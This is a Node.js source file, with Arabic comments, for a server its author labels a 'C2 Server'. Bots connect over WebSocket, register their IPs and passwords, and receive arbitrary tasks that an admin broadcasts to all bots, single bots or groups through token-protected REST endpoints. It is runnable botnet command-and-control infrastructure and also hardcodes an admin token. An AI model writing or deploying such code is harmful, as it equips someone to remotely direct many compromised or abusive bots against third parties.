const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const Redis = require('ioredis');
const crypto = require('crypto');
const path = require('path');

// ====== CONFIG ======
const PORT = 3000;
const AUTH_TOKEN = 'Hz8kLm9pQ2xR5vN7wY3tB6cF4jA1dE0g'; // غيرها لحاجة انت عارفها

// ====== INIT ======
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, path: '/ws' });
const redis = new Redis();

app.use(express.json({ limit: '50mb' }));

// ====== WEBSOCKET — البوتات تتصل هنا ======
const botConnections = new Map(); // botId -> ws

wss.on('connection', (ws, req) => {
    const clientIp = req.socket.remoteAddress;
    let botId = null;

    ws.on('message', async (data) => {
        try {
            const msg = JSON.parse(data);

            switch (msg.type) {
                case 'auth': {
                    botId = msg.id;
                    await redis.hmset(`bot:${botId}`, {
                        id: botId,
                        password: msg.password,
                        ip: clientIp,
                        status: 'idle',
                        lastSeen: Date.now().toString(),
                        wsConnected: 'true'
                    });
                    await redis.sadd('bots:all', botId);
                    botConnections.set(botId, ws);
                    ws.send(JSON.stringify({ type: 'auth_ok', id: botId }));
                    console.log(`✅ Bot connected: ${botId}`);

                    // شوف لو فيه مهمة معلقة
                    const pendingTask = await redis.lpop(`tasks:${botId}`);
                    if (pendingTask) ws.send(pendingTask);
                    break;
                }

                case 'report': {
                    const { status, message, taskId } = msg;
                    await redis.hmset(`bot:${botId}`, {
                        status,
                        lastMessage: message || '',
                        lastSeen: Date.now().toString()
                    });
                    await redis.lpush(`logs:${botId}`, JSON.stringify({ time: Date.now(), status, message, taskId }));
                    await redis.ltrim(`logs:${botId}`, 0, 99);

                    if (status === 'done' || status === 'failed') {
                        const nextTask = await redis.lpop(`tasks:${botId}`);
                        if (nextTask) ws.send(nextTask);
                        else ws.send(JSON.stringify({ type: 'idle' }));
                    }
                    break;
                }

                case 'ready': {
                    const task = await redis.lpop(`tasks:${botId}`);
                    if (task) ws.send(task);
                    else {
                        const globalTask = await redis.lpop('tasks:global');
                        if (globalTask) ws.send(globalTask);
                        else ws.send(JSON.stringify({ type: 'idle' }));
                    }
                    break;
                }

                case 'ping': {
                    ws.send(JSON.stringify({ type: 'pong' }));
                    break;
                }
            }
        } catch (err) {
            console.error(`WS Error from ${botId}:`, err.message);
        }
    });

    ws.on('close', () => {
        if (botId) {
            redis.hmset(`bot:${botId}`, { status: 'offline', wsConnected: 'false', lastSeen: Date.now().toString() });
            botConnections.delete(botId);
            console.log(`❌ Bot disconnected: ${botId}`);
        }
    });
});

// ====== MIDDLEWARE ======
function requireAdmin(req, res, next) {
    const token = req.headers['authorization'];
    if (token !== `Bearer ${AUTH_TOKEN}`) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
}

// ====== REST API ======

// إرسال مهمة لكل البوتات
app.post('/api/task/broadcast', requireAdmin, async (req, res) => {
    const { actions } = req.body;
    if (!actions || !Array.isArray(actions) || actions.length === 0) {
        return res.status(400).json({ error: 'actions array required' });
    }

    const task = JSON.stringify({
        type: 'task',
        id: crypto.randomUUID(),
        actions,
        createdAt: Date.now()
    });

    await redis.rpush('tasks:global', task);

    // لو في بوتات متصلة دلوقتي، ابعتهولهم فوراً
    for (const [bid, ws] of botConnections) {
        try {
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(task);
            }
        } catch (e) { /* ignore */ }
    }

    const botCount = await redis.scard('bots:all');
    res.json({ success: true, message: `Task queued for ${botCount} bots` });
});

// إرسال مهمة لبوت واحد
app.post('/api/task/single', requireAdmin, async (req, res) => {
    const { botId, actions } = req.body;
    if (!botId || !actions) return res.status(400).json({ error: 'botId and actions required' });

    const task = JSON.stringify({
        type: 'task',
        id: crypto.randomUUID(),
        actions,
        createdAt: Date.now()
    });

    await redis.rpush(`tasks:${botId}`, task);

    const ws = botConnections.get(botId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(task);
    }

    res.json({ success: true, message: `Task sent to ${botId}` });
});

// إرسال مهمة لمجموعة
app.post('/api/task/group', requireAdmin, async (req, res) => {
    const { group, actions } = req.body;
    if (!group || !actions) return res.status(400).json({ error: 'group and actions required' });

    const task = JSON.stringify({
        type: 'task',
        id: crypto.randomUUID(),
        actions,
        createdAt: Date.now()
    });

    const members = await redis.smembers(`group:${group}`);
    let sentCount = 0;
    for (const bid of members) {
        await redis.rpush(`tasks:${bid}`, task);
        const ws = botConnections.get(bid);
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(task);
            sentCount++;
        }
    }

    res.json({ success: true, message: `Task sent to group ${group}`, onlineSent: sentCount, totalTargeted: members.length });
});

// إنشاء مجموعة
app.post('/api/group/create', requireAdmin, async (req, res) => {
    const { group, bots } = req.body;
    if (!group || !bots || !Array.isArray(bots)) return res.status(400).json({ error: 'group and bots array required' });

    await redis.del(`group:${group}`);
    for (const bid of bots) await redis.sadd(`group:${group}`, bid);

    res.json({ success: true, message: `Group ${group} created with ${bots.length} bots` });
});

// إيقاف الكل
app.post('/api/stop/all', requireAdmin, async (req, res) => {
    await redis.del('tasks:global');
    const botIds = await redis.smembers('bots:all');
    for (const bid of botIds) {
        await redis.del(`tasks:${bid}`);
        const ws = botConnections.get(bid);
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'stop' }));
        }
    }
    res.json({ success: true, message: 'All bots stopped' });
});

// Dashboard
app.get('/api/dashboard', requireAdmin, async (req, res) => {
    const botIds = await redis.smembers('bots:all');
    let total = botIds.length, idle = 0, working = 0, done = 0, failed = 0, offline = 0;
    const botsData = [];

    for (const bid of botIds) {
        const data = await redis.hgetall(`bot:${bid}`);
        if (data) {
            botsData.push(data);
            switch (data.status) {
                case 'idle': idle++; break;
                case 'working': working++; break;
                case 'done': done++; break;
                case 'failed': failed++; break;
                case 'offline': offline++; break;
                default: offline++; break;
            }
        }
    }

    res.json({ total, idle, working, done, failed, offline, bots: botsData.slice(-100) });
});

// قائمة المجموعات
app.get('/api/groups', requireAdmin, async (req, res) => {
    const keys = await redis.keys('group:*');
    const groups = [];
    for (const key of keys) {
        const members = await redis.smembers(key);
        groups.push({ name: key.replace('group:', ''), count: members.length });
    }
    res.json({ groups });
});

// Serve static files (لوحة التحكم)
app.use(express.static(path.join(__dirname, 'public')));

// ====== START ======
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 C2 Server on http://0.0.0.0:${PORT}`);
    console.log(`📡 WebSocket on ws://0.0.0.0:${PORT}/ws`);
});